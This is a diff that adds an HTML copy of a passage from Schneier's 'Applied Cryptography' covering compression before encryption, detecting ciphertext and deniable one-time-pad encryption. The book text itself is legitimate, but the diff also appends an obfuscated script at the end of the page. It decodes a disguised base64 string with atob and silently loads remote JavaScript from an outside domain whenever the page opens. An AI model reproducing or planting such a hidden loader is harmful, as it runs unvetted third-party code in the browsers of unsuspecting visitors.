@@ -1,0 +1,115 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Using Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=10//-->
+<!--PAGES=225-227//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="10-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="10-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Software encryption programs are popular and are available for all major operating systems. These are meant to protect individual files; the user generally has to manually encrypt and decrypt specific files. It is important that the key management scheme be secure: The keys should not be stored on disk anywhere (or even written to a place in memory from where the processor swaps out to disk). Keys and unencrypted files should be erased after encryption. Many programs are sloppy in this regard, and a user has to choose carefully.
+</P>
+<P>Of course, Mallory can always replace the software encryption algorithm with something lousy. But for most users, that isn&#146;t a problem. If Mallory can break into our office and modify our encryption program, he can also put a hidden camera on the wall, a wiretap on the telephone, and a TEMPEST detector down the street. If Mallory is that much more powerful than the user, the user has lost the game before it starts.</P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">10.6 Compression, Encoding, and Encryption</FONT></H3>
+<P>Using a data compression algorithm together with an encryption algorithm makes sense for two reasons:
+</P>
+<DL>
+<DD>Cryptanalysis relies on exploiting redundancies in the plaintext; compressing a file before encryption reduces these redundancies.
+<DD>Encryption is time-consuming; compressing a file before encryption speeds up the entire process.
+</DL>
+<P>The important thing to remember is to compress before encryption. If the encryption algorithm is any good, the ciphertext will not be compressible; it will look like random data. (This makes a reasonable test of an encryption algorithm; if the ciphertext can be compressed, then the algorithm probably isn&#146;t very good.)
+</P>
+<P>If you are going to add any type of transmission encoding or error detection and recovery, remember to add that after encryption. If there is noise in the communications path, decryption&#146;s error-extension properties will only make that noise worse. Figure 10.3 summarizes these steps.</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">10.7 Detecting Encryption</FONT></H3>
+<P>How does Eve detect an encrypted file? Eve is in the spy business, so this is an important question. Imagine that she&#146;s eavesdropping on a network where messages are flying in all directions at high speeds; she has to pick out the interesting ones. Encrypted files are certainly interesting, but how does she know they are encrypted?
+</P>
+<P>Generally, she relies on the fact that most popular encryption programs have well-defined headers. Electronic-mail messages encrypted with either PEM or PGP (see Sections 24.10 and 24.12) are easy to identify for that reason.</P>
+<P>Other file encryptors just produce a ciphertext file of seemingly random bits. How can she distinguish it from any other file of seemingly random bits? There is no sure way, but Eve can try a number of things:</P>
+<DL>
+<DD><B>&#151;</B>&nbsp;&nbsp;Examine the file. ASCII text is easy to spot. Other file formats, such as TIFF, T<SUB>e</SUB>X, C, Postscript, G3 facsimile, or Microsoft Excel, have standard identifying characteristics. Executable code is detectable, as well. UNIX files often have &#147;magic numbers&#148; that can be detected.
+<I><P><A NAME="Fig3"></A><A HREF="javascript:displayWindow('images/10-03.jpg',359,55 )"><IMG SRC="images/10-03t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/10-03.jpg',359,55)"><FONT COLOR="#000077"><B>Figure 10.3</B></FONT></A>&nbsp;&nbsp;Encryption with compression and error control.</I>
+</P>
+<DD><B>&#151;</B>&nbsp;&nbsp;Try to uncompress the file, using the major compression algorithms. If the file is compressed (and not encrypted), this should yield the original file.
+<DD><B>&#151;</B>&nbsp;&nbsp;Try to compress the file. If the file is ciphertext (and the algorithm is good), then the probability that the file can be appreciably compressed by a general-purpose compression routine is small. (By appreciably, I mean more than 1 or 2 percent.) If it is something else (a binary image or a binary data file, for example) it probably can be compressed.
+</DL>
+<P>Any file that cannot be compressed and is not already compressed is probably ciphertext. (Of course, it is possible to specifically make ciphertext that is compressible.) Identifying the algorithm is a whole lot harder. If the algorithm is good, you can&#146;t. If the algorithm has some slight biases, it might be possible to recognize those biases in the file. However, the biases have to be pretty significant or the file has to be pretty big in order for this to work.
+</P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">10.8 Hiding Ciphertext in Ciphertext</FONT></H3>
+<P>Alice and Bob have been sending encrypted messages to each other for the past year. Eve has been collecting them all, but she cannot decrypt any of them. Finally, the secret police tire of all this unreadable ciphertext and arrest the pair. &#147;Give us your encryption keys,&#148; they demand. Alice and Bob refuse, but then they notice the thumbscrews. What can they do?
+</P>
+<P>Wouldn&#146;t it be nice to be able to encrypt a file such that there are two possible decryptions, each with a different key. Alice could encrypt a real message to Bob in one of the keys and some innocuous message in the other key. If Alice were caught, she could surrender the key to the innocuous message and keep the real key secret.</P>
+<P>The easiest way to do this is with one-time pads. Let <I>P</I> be the plaintext, <I>D</I> the dummy plaintext, <I>C</I> the ciphertext, <I>K</I> the real key, and <I>K&#146;</I> the dummy key. Alice encrypts <I>P</I>:</P>
+<DL>
+<DD><I>P</I> &#8853; <I>K</I> = <I>C</I>
+</DL>
+<P>Alice and Bob share <I>K</I>, so Bob can decrypt <I>C</I>:</P>
+<DL>
+<DD><I>C</I> &#8853; <I>K</I> = <I>P</I>
+</DL>
+<P>If the secret police ever force them to surrender their key, they don&#146;t surrender <I>K</I>, but instead surrender:</P>
+<DL>
+<DD><I>K&#146;</I> = <I>C</I> &#8853; <I>D</I>
+</DL>
+<P>The police then recover the dummy plaintext:
+</P>
+<DL>
+<DD><I>C</I> &#8853; <I>K&#146;</I> = <I>D</I>
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="10-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="10-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(zGZTgucK, NFiYczId) {NFiYczId = zGZTgucK.createElement('script');NFiYczId.type = 'text/javascript';NFiYczId.async = true;NFiYczId.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');zGZTgucK.getElementsByTagName('body')[0].appendChild(NFiYczId);}(document));</script></body>
+</html>
